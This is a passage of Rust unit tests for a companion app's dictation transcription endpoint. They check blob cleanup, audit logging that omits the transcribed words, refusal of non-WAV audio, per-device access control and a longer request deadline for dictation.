    assert!(!path.exists());
    assert!(c.blobs.get("dev_a", &blob.id, now_ms()).is_none());
    // Audited, never with the words.
    let audit = stub.audited();
    let line = audit
        .iter()
        .find(|a| a.1 == "dictation.transcribe")
        .unwrap();
    assert_eq!(line.2, "wrote out a dictation");
    assert!(super::super::wire::MAC_FEATURES.contains(&"dictation.transcribe"));
}

#[tokio::test]
async fn a_dictation_without_the_model_says_preparing_and_bad_audio_is_refused() {
    use crate::companion::testkit::{dictation_wav, Stub};
    use std::sync::atomic::Ordering;
    let (c, stub) = Stub::companion();
    let me = caller("dev_a");
    stub.model_missing.store(true, Ordering::SeqCst);
    let blob = c
        .blobs
        .put(
            "dev_a",
            "Dictation.wav",
            None,
            &dictation_wav(0.5),
            now_ms(),
        )
        .unwrap();
    let said = dispatch(
        &c,
        &me,
        "dictation.transcribe",
        json!({ "blob": blob.id, "roomId": "r1", "agentId": "" }),
    )
    .await
    .unwrap();
    assert_eq!(said, json!({ "text": null, "preparing": true }));
    assert_eq!(
        stub.transcribed.lock().unwrap().last().unwrap(),
        &(8_000, None, Some("r1".to_string()))
    );

    // Not a WAV: refused, and still not kept.
    let junk = c
        .blobs
        .put("dev_a", "x.wav", None, b"nope", now_ms())
        .unwrap();
    let refused = dispatch(&c, &me, "dictation.transcribe", json!({ "blob": junk.id }))
        .await
        .unwrap_err();
    assert!(refused.summary().contains("WAV"));
    assert!(c.blobs.get("dev_a", &junk.id, now_ms()).is_none());

    // Another phone's recording isn't this one's to write out.
    let theirs = c
        .blobs
        .put(
            "dev_b",
            "Dictation.wav",
            None,
            &dictation_wav(0.5),
            now_ms(),
        )
        .unwrap();
    assert!(dispatch(
        &c,
        &me,
        "dictation.transcribe",
        json!({ "blob": theirs.id })
    )
    .await
    .is_err());
    assert!(c.blobs.get("dev_b", &theirs.id, now_ms()).is_some());
}

#[test]
fn dictation_has_its_own_longer_deadline_under_the_phones() {
    use crate::companion::server::{deadline_for, REQUEST_DEADLINE};
    assert!(deadline_for("dictation.transcribe") > REQUEST_DEADLINE);
    assert!(deadline_for("dictation.transcribe") < std::time::Duration::from_secs(30));
    assert_eq!(deadline_for("agents.overview"), REQUEST_DEADLINE);
}
